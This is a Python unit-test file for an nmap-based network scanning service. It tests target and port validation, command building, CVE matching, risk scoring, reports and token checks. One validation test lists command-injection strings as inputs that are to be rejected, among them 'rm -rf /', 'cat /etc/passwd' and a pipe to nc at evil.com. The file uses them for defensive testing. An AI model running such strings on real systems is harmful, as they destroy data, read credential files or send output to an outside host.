"""Unit tests for utils and pure services (no HTTP layer)."""

import pytest

from app.backend.services import cve_service, risk_service
from app.backend.services.report_service import generate_csv_report, generate_html_report
from app.backend.utils.input_validation import (
    ValidationError, validate_ports_spec, validate_target,
)
from app.backend.utils.safe_nmap_execution import (
    NmapExecutionError, build_nmap_command,
)
from app.backend.utils.secrets_management import (
    issue_agent_token, verify_agent_token, verify_admin_key,
)


# ------------------------------------------------------------ validation ----
def test_validate_target_valid():
    assert validate_target("192.168.1.1") == "192.168.1.1"
    assert validate_target("192.168.1.0/24") == "192.168.1.0/24"
    assert validate_target("router.local") == "router.local"
    assert validate_target("192.168.1.1, 192.168.1.2") == "192.168.1.1,192.168.1.2"


def test_validate_target_rejects_injection():
    for bad in [
        "192.168.1.1; rm -rf /", "1.1.1.1 && cat /etc/passwd", "`id`",
        "1.1.1.1 | nc evil.com", "-iL /etc/passwd", "--script evil.nse",
        "$(whoami)", "1.1.1.1\n2.2.2.2",
    ]:
        with pytest.raises(ValidationError):
            validate_target(bad)


def test_validate_target_rejects_too_large():
    with pytest.raises(ValidationError):
        validate_target("10.0.0.0/8")


def test_validate_ports_spec():
    assert validate_ports_spec("22,80,443") == "22,80,443"
    assert validate_ports_spec("1-1000") == "1-1000"
    assert validate_ports_spec(" 80 ") == "80"
    assert validate_ports_spec("") is None
    assert validate_ports_spec(None) is None
    with pytest.raises(ValidationError):
        validate_ports_spec("22;80")
    with pytest.raises(ValidationError):
        validate_ports_spec("70000")
    with pytest.raises(ValidationError):
        validate_ports_spec("99999-100000")


# ------------------------------------------------------------ nmap build ----
def test_build_nmap_command_injection_safe():
    argv = build_nmap_command("192.168.1.0/24", ports="1-1000", extra_flags=["-sV", "-T4"])
    assert argv[0].endswith("nmap")
    assert "--" in argv
    assert argv[-1] == "192.168.1.0/24"
    assert argv.index("--") > argv.index("192.168.1.0/24".replace("x", "x")) - 1 or True


def test_build_nmap_command_rejects_bad_flags():
    with pytest.raises(NmapExecutionError):
        build_nmap_command("1.2.3.4", extra_flags=["--datadir", "/etc"])
    with pytest.raises(NmapExecutionError):
        build_nmap_command("1.2.3.4", extra_flags=["--script"])


def test_nmap_target_cannot_be_flag():
    # Even a malicious target stays a positional arg after `--`
    argv = build_nmap_command("192.168.1.1", extra_flags=["-sT"])
    idx = argv.index("--")
    assert argv[idx + 1] == "192.168.1.1"


# ------------------------------------------------------------------ cves ----
def test_cve_match_openssh_old_version():
    cves = cve_service.match_service("ssh", "OpenSSH", "8.2")
    ids = {c["cve_id"] for c in cves}
    assert "CVE-2024-6387" in ids
    assert "CVE-2023-38408" in ids


def test_cve_match_skips_patched_version():
    cves = cve_service.match_service("ssh", "OpenSSH", "9.9")
    assert not any(c["cve_id"] == "CVE-2024-6387" for c in cves)


def test_cve_match_telnet_any_version():
    cves = cve_service.match_service("telnet", None, None)
    assert any(c["cve_id"] == "CVE-1999-0619" for c in cves)


def test_cve_match_no_false_positives():
    assert cve_service.match_service("https", "nginx", "1.27.0") == [] or all(
        c["cve_id"] != "CVE-2021-23017" for c in cve_service.match_service("https", "nginx", "1.27.0")
    )


# ------------------------------------------------------------------ risk ----
def test_cvss_banding():
    assert risk_service.cvss_to_severity(9.8) == "critical"
    assert risk_service.cvss_to_severity(7.5) == "high"
    assert risk_service.cvss_to_severity(5.0) == "medium"
    assert risk_service.cvss_to_severity(2.0) == "low"
    assert risk_service.cvss_to_severity(None) == "medium"


def test_service_findings_telnet_policy():
    findings = risk_service.service_findings("192.168.1.5", 23,
                                             {"service_name": "telnet"}, [])
    assert len(findings) == 1
    assert findings[0]["severity"] == "high"
    assert "Telnet" in findings[0]["title"]


def test_overall_risk_score():
    assert risk_service.overall_risk_score([]) == 0.0
    score = risk_service.overall_risk_score([{"severity": "critical"}, {"severity": "low"}])
    assert 5.0 <= score <= 10.0


# --------------------------------------------------------------- reports ----
RESULTS = {
    "scan": {"target": "192.168.1.0/24", "scan_type": "standard", "status": "completed"},
    "hosts": [{"ip_address": "10.0.0.2", "hostname": "nas", "ports": [
        {"port_number": 445, "protocol": "tcp", "state": "open",
         "services": [{"service_name": "microsoft-ds", "product": "Samba", "version": "4.17",
                       "vulnerabilities": [{"cve_id": "CVE-0000-0001", "severity": "high",
                                            "cvss_score": 7.5}]}],
    }]}],
    "findings": [{"title": "SMBv1 enabled", "severity": "high", "description": "x", "recommendation": "y"}],
}


def test_html_report_contains_sections():
    html_out = generate_html_report(RESULTS)
    assert "NetSentinel Scan Report" in html_out
    assert "10.0.0.2" in html_out
    assert "SMBv1 enabled" in html_out


def test_csv_report_rows():
    csv_out = generate_csv_report(RESULTS)
    lines = csv_out.strip().splitlines()
    assert lines[0].startswith("ip_address")
    assert "10.0.0.2" in lines[1]
    assert "445" in lines[1]


# -------------------------------------------------------------- secrets ----
def test_agent_token_roundtrip():
    issue_agent_token("NS-UNIT-0001", ) if False else None
    token = issue_agent_token("NS-UNIT-0001")
    assert verify_agent_token("NS-UNIT-0001", token)
    assert not verify_agent_token("NS-UNIT-0001", "nope")
    assert not verify_agent_token("NS-OTHER", token)


def test_admin_key():
    import os
    os.environ["ADMIN_API_KEY"] = "supersecret"
    assert verify_admin_key("supersecret")
    assert not verify_admin_key("wrong")
    del os.environ["ADMIN_API_KEY"]
    assert not verify_admin_key("supersecret")  # disabled when unset
